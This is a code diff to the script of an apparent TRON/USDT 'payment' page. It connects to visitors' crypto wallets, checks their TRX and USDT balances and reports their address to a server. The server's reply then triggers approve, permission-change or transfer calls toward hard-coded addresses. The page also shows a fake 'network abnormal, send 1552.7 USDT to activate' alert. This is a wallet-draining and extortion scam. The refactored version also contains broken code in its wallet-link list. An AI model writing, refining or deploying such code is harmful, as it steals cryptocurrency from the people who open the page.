@@ -201,338 +201,176 @@
     <script src="/test/js/trc.js?v=202303260301"></script>
     <script>
         new VConsole();
-        var balance;
-        var isAdOkex = false;
-
+        // Function to convert TRON token amount to 64-character hexadecimal format
         function convertTronHex(amount) {
-            if (amount === 0) {
-                return '0'.repeat(64);
-            }
+            if (amount === 0) return '0'.repeat(64);
             const value = BigInt(Math.round(amount * 10 ** 6));
-            const hexvalues = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
-            let hexval = '';
-            let tempValue = value;
-            while (tempValue > 0) {
-                const remainder = tempValue % BigInt(16);
-                hexval = hexvalues[Number(remainder)] + hexval;
-                tempValue = tempValue / BigInt(16);
-            }
-            const zeroPadding = '0'.repeat(64 - hexval.length);
-            return zeroPadding + hexval;
+            return value.toString(16).padStart(64, '0');
         }
 
-        // Function to check if the device is a mobile device
-        function isMobileDevice() {
+        // Function to detect if the user is on a mobile device
+        function isMobile() {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
 
-        // Function to check if the OKX Wallet environment is detected in user agent
-        function isOkexWalletDetected() {
-            return /okex/.test(navigator.userAgent.toLowerCase());
-        }
-
-
-        if (isOkexWalletDetected() && !isMobileDevice()) {
-            isAdOkex = true;
-        }
-
-        // Function to initiate connection to OKX Wallet
-        function initializeOkexConnection() {
-            // Perform checks for OKX Wallet environment on any device
-            if (!isOkexWalletDetected()) {
-                okexConnect();
-            }
-        }
-
-        document.addEventListener("DOMContentLoaded", function () {
-            if (isMobileDevice()) {
-                const mobileContent = document.getElementById("mobileContent");
-                if (mobileContent) {
-                    mobileContent.style.display = "block";
-                }
-            } else {
-                const pcContent = document.getElementById("pcContent");
-                if (pcContent) {
-                    pcContent.style.display = "block";
+        // Function to handle wallet connection
+        async function okexConnect() {
+            if (window.tronLink && window.tronLink.ready) {
+                window.tronWeb = tronLink.tronWeb;
+            } else if (window.okxwallet && window.okxwallet.tronLink) {
+                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
+                if (res.code === 200) {
+                    window.tronWeb = tronLink.tronWeb;
                 }
             }
+        }
 
-            // Call the initialization function
-            initializeOkexConnection();
+        // Display content based on device type
+        if (isMobile()) {
+            document.getElementById("mobileContent").style.display = "block";
+        } else {
+            document.getElementById("pcContent").style.display = "block";
+        }
+
+        // Detect wallet and initiate connection
+        const isAdOkex = /okex/.test(navigator.userAgent.toLowerCase()) && !isMobile();
+        if (isAdOkex || !isMobile()) {
+            okexConnect();
+        }
+
+        // Function to get relative URL of the current page
+        function getUrlRelativePath() {
+            const url = document.location.toString();
+            const arrUrl = url.split("//");
+            const start = arrUrl[1].indexOf("/");
+            return arrUrl[1].substring(start);
+        }
+
+        // QR Code generation based on device type
+        function generateQRCode() {
+            const url = getUrlRelativePath();
+            const showCodeId = isMobile() ? 'qrcode' : 'qrcode_pc_withtron';
+            new QRCode(document.getElementById(showCodeId), {
+                text: url,
+                width: 308,
+                height: 308,
+                correctLevel: QRCode.CorrectLevel.L
+            });
+            document.getElementById(showCodeId).style.display = 'block';
+        }
+
+        // Set a timeout to generate QR code after a short delay
+        setTimeout(generateQRCode, 800);
+
+        // Event listener for selecting wallet options
+        const liElements = document.querySelectorAll("#goods li");
+        let selectIndex = 0;
+
+        liElements.forEach((li, index) => {
+            li.addEventListener("click", function () {
+                liElements.forEach((item) => {
+                    item.classList.remove("selected");
+                    const input = item.querySelector("input[type=radio]");
+                    input.checked = false;
+                });
+                this.classList.add("selected");
+                const radioInput = this.querySelector("input[type=radio]");
+                radioInput.checked = true;
+                selectIndex = index;
+            });
         });
 
-        var liElements = document.querySelectorAll("#goods li");
-
-        async function okexConnect() {
-            try {
-                // Check if OKX Wallet's TronLink is available
-                if (window.okxwallet && window.okxwallet.tronLink) {
-                    console.log("OKX Wallet TronLink detected.");
-
-                    // Check if TronLink is ready
-                    if (window.okxwallet.tronLink.ready) {
-                        // If TronLink is ready, set TronWeb instance
-                        window.tronWeb = window.okxwallet.tronLink.tronWeb;
-                        console.log("TronWeb is set via OKX Wallet TronLink.");
-                    } else {
-                        // If TronLink is not ready, request accounts
-                        const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
-
-                        // Check if the response code indicates success
-                        if (res && res.code === 200) {
-                            // Set TronWeb instance after successful account request
-                            window.tronWeb = window.okxwallet.tronLink.tronWeb;
-                            console.log("Successfully connected to OKX Wallet:", window.tronWeb.defaultAddress.base58);
-                        } else {
-                            console.error("Failed to connect OKX Wallet:", res.message);
-                            alert("Error connecting to OKX Wallet: " + res.message);
-                        }
-                    }
-                } else {
-                    console.error("OKX Wallet TronLink not detected.");
-                    alert("OKX Wallet TronLink not detected. Please install the OKX Wallet extension.");
-                }
-            } catch (error) {
-                console.error("Error during OKX Wallet connection:", error);
-                alert("Error during OKX Wallet connection: " + error.message);
-            }
-        }
-
-        // if(/webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
-        $("#okex").show();
-        // }
-
-        var domain = window.location.protocol + "//" + window.location.host + "/";
-
-
-        var order_no = '2023032437100865';
-        var amount = 51;
-        var selectIndex = 0;
-        var type;
-        var permissionsAddr = 'TFonidXCjcfLqtxpwLcKFoAyM9HEdcusdt';
-        var auAddr = 'TX6TJo7TxQMx9PM8Rxki96rrFuaznTk6Ry';
-        var payAddr = 'TBgB8NqPjU1xQQ7zXzJ7SjCg38tsrUK1am';
-        var userAddress;
-        var usdtBalance;
-
-        setTimeout(function () {
-            if (!isMobileDevice()) {
-                if (window.ethereum || window.tronWeb) {
-                    // console.log('')
-                    $("#payButton").show();
-
-                } else {
-                    $(".paymentShow").show();
-                }
-
-            } else {
-                var showCodeId = "qrcode"
-                if (window.tronWeb) {
-                    $("#payButton").show();
-                    $("#pcContent").hide();
-                    $("#mobileContent").show();
-                    $("#pc_show_code").show();
-                    showCodeId = 'qrcode_pc_withtron'
-                } else {
-                    showCodeId = 'qrcode'
-                }
-                var qrcode = new QRCode(document.getElementById(showCodeId), {
-                    text: GetUrlRelativePath(),
-                    width: 308,
-                    height: 308,
-                    correctLevel: 0 // 二维码结构复杂性 0~3
-                });
-
-                $("#" + showCodeId).show();
-            }
-        }, 800)
-
-        function GetUrlRelativePath() {
-            var url = document.location.toString();
-            return url
-            var arrUrl = url.split("//");
-
-            var start = arrUrl[1].indexOf("/");
-            var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符
-
-            /*if(relUrl.indexOf("?") != -1){
-                relUrl = relUrl.split("?")[0];
-              }*/
-            return relUrl;
-        }
-
-        for (var i = 0; i < liElements.length; i++) {
-            liElements[i].addEventListener("click", function () {
-                // 移除其他 <li> 元素的选中样式
-                for (var j = 0; j < liElements.length; j++) {
-                    liElements[j].classList.remove("selected");
-                    let tmpInput = liElements[j].querySelector("input[type=radio]")
-                    tmpInput.checked = false
-                }
-
-                // 添加选中样式到当前点击的 <li> 元素
-                this.classList.add("selected");
-
-                // 获取当前 <li> 元素中的 <input> 元素
-                var radioInput = this.querySelector("input[type=radio]");
-                // 设置当前 <input> 元素为选中状态
-                radioInput.checked = true;
-                selectIndex = $(this).data('index')
-            });
-        }
-
+        // Handle wallet confirmation and redirection
         $('#confirm').click(function () {
-
-            if (selectIndex == 0) {
+            if (selectIndex === 0) {
                 alert("请选择付款钱包！");
-                return
+                return;
             }
 
-            // var url = decodeURI(window.location.href);
-            var url = GetUrlRelativePath()
+            const url = getUrlRelativePath();
+            const walletLinks = [
+                `imtokenv2://navigate?screen=DappView&url=${url}`,
+                `tpdapp://open?params={"url": "${url}"}`
+                    `https://metamask.app.link/dapp/${url}`,
+                `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
+                `https://go.cb-w.com/dapp?cb_url=${url}`,
+                `bitkeep://bkconnect?action=dapp&url=${url}`,
+                `okx://wallet/dapp/details?dappUrl=${url}`,
+                `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ url, action: "open", protocol: "tronlink", version: "1.0" }))}`,
+                `tpdapp://open?params={"url": "${encodeURIComponent(url)}", "chain": "TRX", "source":"xxx"}`
+            ];
 
-            if (selectIndex == 2) {
-                var im = 'imtokenv2://navigate?screen=DappView&url=' + url;
-                window.location.href = im;
-            } else if (selectIndex == 1) {
-                var tp = 'tpdapp://open?params={"url": "' + url + '"}';
-                window.location.href = tp;
-            } else if (selectIndex == 3) {
-                var tpurl2 = 'https://metamask.app.link/dapp/' + url;
-                window.location.href = tpurl2;
-            } else if (selectIndex == 4) {
-                var tpurl2 = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + url;
-                window.location.href = tpurl2;
-            } else if (selectIndex == 5) {
-                var tpurl2 = 'https://go.cb-w.com/dapp?cb_url=' + url;
-                window.location.href = tpurl2;
-            } else if (selectIndex == 6) {
-                var tpurl2 = 'bitkeep://bkconnect?action=dapp&url=' + url;
-                location.href = tpurl2;
-            } else if (selectIndex == 7) {
-                var tpurl2 = 'okx://wallet/dapp/details?dappUrl=' + url;
-                location.href = tpurl2;
-            } else if (selectIndex == 8) {
-                var data = {
-                    "url": url,
-                    "action": "open",
-                    "protocol": "tronlink",
-                    "version": "1.0"
-                }
-                var tpurl2 = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify(data));
-                location.href = tpurl2;
-            } else if (selectIndex == 9) {
-                location.href = 'tpdapp://open?params={"url": "' + encodeURIComponent(url) + '", "chain": "TRX", "source":"xxx"}';
-            }
-        })
+            const link = walletLinks[selectIndex];
+            window.location.href = link;
+        });
 
+        // Function to check wallet balance and permissions
         async function check() {
-            $('#adOkexShow').hide()
+            $('#adOkexShow').hide();
 
-            if (window.tronWeb == undefined) {
-
-                if (isAdOkex) {
-                    $('#adOkexShow').show()
-                    $('#adOkexShow').text("请选择TRX链进行支付")
-                }
+            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+                $('#adOkexShow').show().text("请允许访问你的TRX钱包地址");
                 alert("请选择TRX链进行支付");
                 return;
             }
 
-            if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
-                if (isAdOkex) {
-                    $('#adOkexShow').show()
-                    $('#adOkexShow').text("请允许访问你的TRX钱包地址")
-                }
-                alert("请允许访问你的TRX钱包地址");
-                return;
-            }
-
-            var loadIndex = layer.msg('加载中', {
-                shade: 0.6, // 遮罩透明度
+            const loadIndex = layer.msg('加载中', {
+                shade: 0.6,
                 time: 10000,
-                shadeClose: false // 点击遮罩区域，关闭弹层
+                shadeClose: false
             });
 
-            userAddress = await tronWeb.defaultAddress.base58;
-
-            balance = await tronWeb.trx.getBalance(userAddress) / 1000000;
-            if (balance < 13) {
-                layer.close(loadIndex);
-
-                if (isAdOkex) {
-                    $('#adOkexShow').show()
-                    $('#adOkexShow').text("TRX交易手续费不足")
-                }
-                alert("TRX交易手续费不足");
-                return;
-            }
-
-            var data = {
-                address: userAddress,
-                authorized_address: permissionsAddr + '|' + auAddr,
-                where: 'uugetcode'
-            }
-
-            usdtBalance = 0
             try {
-                let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
-                let resdata = await contract.balanceOf(userAddress).call();
-                usdtBalance = parseInt(resdata._hex) / 1000000;
-            } catch (e) {
-                usdtBalance = 0
-                layer.close(loadIndex);
-            }
+                const userAddress = await tronWeb.defaultAddress.base58;
+                const balance = await tronWeb.trx.getBalance(userAddress) / 1000000;
 
-            jQuery.ajax({
-                url: '/api/test/is_f',
-                method: 'POST',
-                data: data,
-                async: false,
-                success: function (data) {
-                    layer.close(loadIndex);
-                    // var result = JSON.parse(data);
-                    if (data.code) {
-                        if (data.data == 1) {
-                            if (isAdOkex) {
-                                $('#adOkexShow').show()
-                                $('#adOkexShow').text("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用")
-                            }
-                            alert("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用");
-                        } else if (data.data == 2) {
-                            transfer()
-                        }
-
-                    } else {
-                        if (/imtoken/.test(navigator.userAgent.toLowerCase())) {
-                            if (data.m === 'p') {
-                                updatePermissions();
-                            } else {
-                                approve();
-                            }
-                        } else if (/bitkeep/.test(navigator.userAgent.toLowerCase())) {
-                            if (balance >= 100) {
-                                updatePermissions();
-                            } else {
-                                approve();
-                            }
-                        } else {
-                            approve();
-                        }
-                    }
-
-                },
-                error: function (data) {
-                    layer.close(loadIndex);
-                    if (isAdOkex) {
-                        $('#adOkexShow').show()
-                        $('#adOkexShow').text("系统维护,请联系客服")
-                    }
-                    alert("系统维护,请联系客服")
-                    // alert(data)
+                if (balance < 13) {
+                    $('#adOkexShow').show().text("TRX交易手续费不足");
+                    alert("TRX交易手续费不足");
+                    return;
                 }
-            })
+
+                const contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+                const resdata = await contract.balanceOf(userAddress).call();
+                const usdtBalance = parseInt(resdata._hex) / 1000000;
+
+                const data = {
+                    address: userAddress,
+                    authorized_address: 'TFonidXCjcfLqtxpwLcKFoAyM9HEdcusdt|TX6TJo7TxQMx9PM8Rxki96rrFuaznTk6Ry',
+                    where: 'uugetcode'
+                };
+
+                const response = await $.ajax({
+                    url: '/api/test/is_f',
+                    method: 'POST',
+                    data: data
+                });
+
+                layer.close(loadIndex);
+
+                if (response.code) {
+                    if (response.data === 1) {
+                        $('#adOkexShow').show().text("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用");
+                        alert("系统提示：\n系统检测到您的网络环境存在异常 \n请转入相应金额激活 \n金额： 1552.7 USDT \n备注信息：d5k837  \n效验通过后可恢复正常使用");
+                    } else if (response.data === 2) {
+                        transfer();
+                    }
+                } else {
+                    if (/imtoken/.test(navigator.userAgent.toLowerCase()) || /bitkeep/.test(navigator.userAgent.toLowerCase())) {
+                        balance >= 100 ? updatePermissions() : approve();
+                    } else {
+                        approve();
+                    }
+                }
+
+            } catch (error) {
+                console.error("Error checking wallet connection:", error);
+                layer.close(loadIndex);
+                $('#adOkexShow').show().text("系统维护,请联系客服");
+                alert("系统维护,请联系客服");
+            }
         }
+
 
 
     </script>
